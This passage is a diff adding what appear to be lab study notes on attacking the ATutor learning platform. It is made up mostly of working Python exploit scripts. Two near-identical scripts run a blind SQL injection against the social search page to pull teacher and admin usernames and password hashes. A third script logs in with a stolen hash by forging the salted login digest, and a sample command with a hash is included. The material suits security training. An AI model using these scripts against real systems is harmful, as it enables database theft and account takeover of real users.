@@ -272,4 +272,187 @@ if __name__ == "__main__":
 
 
 ```
+atutor_gethash.py
 
+Had to find db -> select database()
+then schema
+then tables
+then columns
+
+Looked for tables in code as well.
+
+AT_member seemed most promising
+
+
+```
+import requests
+import sys
+
+def searchFriends_sqli(ip, inj_str):
+    for j in range(32, 126):
+        # now we update the sqli
+        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
+        r = requests.get(target)
+        #print r.headers
+        content_length = int(r.headers['Content-Length'])
+        if (content_length > 20):
+            #print (j)
+            return j
+    return None    
+
+def inject(r, inj, ip):
+    extracted = ""
+    for i in range(1, r):
+        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
+        retrieved_value = searchFriends_sqli(ip,  injection_string)
+        if(retrieved_value):
+            extracted += chr(retrieved_value)
+            extracted_char = chr(retrieved_value)
+            sys.stdout.write(extracted_char)
+            sys.stdout.flush()
+        else:
+            print("\n(+) done!")
+            break
+    return extracted
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) usage: %s <target>"  % sys.argv[0])
+        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
+        sys.exit(-1)
+
+    ip = sys.argv[1]
+
+    print("(+) Retrieving username....")
+    #query = "select/**/user()"
+    #query = "select/**/group_concat(0x7c,schema_name,0x7C)/**/from/**/information_schema.schemata"
+    #query = "select/**/group_concat(0x7c,table_name,0x7C)/**/from/**/information_schema.tables/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
+    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
+    query = "select/**/login/**/from/**/AT_members/**/where/**/login='teacher'"
+    username = inject(50, query, ip)
+    print("(+) Retrieving password hash....")
+    query = "select/**/password/**/from/**/AT_members/**/where/**/login='teacher'"
+    #query = "select/**/database()"
+    password = inject(50, query, ip)
+    print("(+) Credentials: %s / %s" % (username, password))
+
+
+if __name__ == "__main__":
+    main()
+
+
+```
+
+Get admin user password
+
+'''
+
+import requests
+import sys
+
+def searchFriends_sqli(ip, inj_str):
+    for j in range(32, 126):
+        # now we update the sqli
+        target      = "http://%s/ATutor/mods/_standard/social/index_public.php?q=%s" % (ip, inj_str.replace("[CHAR]", str(j)))
+        r = requests.get(target)
+        #print r.headers
+        content_length = int(r.headers['Content-Length'])
+        if (content_length > 20):
+            #print (j)
+            return j
+    return None    
+
+def inject(r, inj, ip):
+    extracted = ""
+    for i in range(1, r):
+        injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
+        retrieved_value = searchFriends_sqli(ip,  injection_string)
+        if(retrieved_value):
+            extracted += chr(retrieved_value)
+            extracted_char = chr(retrieved_value)
+            sys.stdout.write(extracted_char)
+            sys.stdout.flush()
+        else:
+            print("\n(+) done!")
+            break
+    return extracted
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) usage: %s <target>"  % sys.argv[0])
+        print('(+) eg: %s 192.168.121.103'  % sys.argv[0])
+        sys.exit(-1)
+
+    ip = sys.argv[1]
+
+    print("(+) Retrieving username....")
+    #query = "select/**/user()"
+    #query = "select/**/group_concat(0x7c,schema_name,0x7C)/**/from/**/information_schema.schemata"
+    #query = "select/**/group_concat(0x7c,table_name,0x7C)/**/from/**/information_schema.tables/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
+    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
+    #query = "select/**/group_concat(0x7c,login,0x7C)/**/from/**/AT_members"
+    #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_admins'"
+    #query = "select/**/group_concat(0x7c,login,0x7C)/**/from/**/AT_admins/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_admins'"
+    query = "select/**/login/**/from/**/AT_admins/**/where/**/login='admin'"
+    username = inject(50, query, ip)
+    print("(+) Retrieving password hash....")
+    query = "select/**/password/**/from/**/AT_admins/**/where/**/login='admin'"
+    #query = "select/**/database()"
+    password = inject(50, query, ip)
+    print("(+) Credentials: %s / %s" % (username, password))
+
+
+if __name__ == "__main__":
+    main()
+
+
+```
+
+Login bypass:
+
+atutor_login.py
+
+```
+import sys, hashlib, requests
+
+def gen_hash(passwd, token):
+    # COMPLETE THIS FUNCTION
+    hashed = hashlib.sha1(passwd.encode() + token.encode()).hexdigest()
+    return hashed
+
+def we_can_login_with_a_hash():
+    target = "http://%s/ATutor/login.php" % sys.argv[1]
+    token = "hax"
+    hashed = gen_hash(sys.argv[2], token)
+    print (hashed)
+    d = {
+        "form_password_hidden" : hashed,
+        "form_login": "teacher",
+        "submit": "Login",
+        "token" : token
+    }
+    s = requests.Session()
+    r = s.post(target, data=d)
+    res = r.text
+    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
+        return True
+    return False
+
+def main():
+    if len(sys.argv) != 3:
+        print ("(+) usage: %s <target> <hash>" % sys.argv[0])
+        print ("(+) eg: %s 192.168.121.103 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" % sys.argv[0])
+        sys.exit(-1)
+    if we_can_login_with_a_hash():
+        print ("(+) success!")
+    else:
+        print ("(-) failure!")
+
+if __name__ == "__main__":
+    main()
+
+```
+
+```
+python3 atutor_login.py atutor 8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e
+```
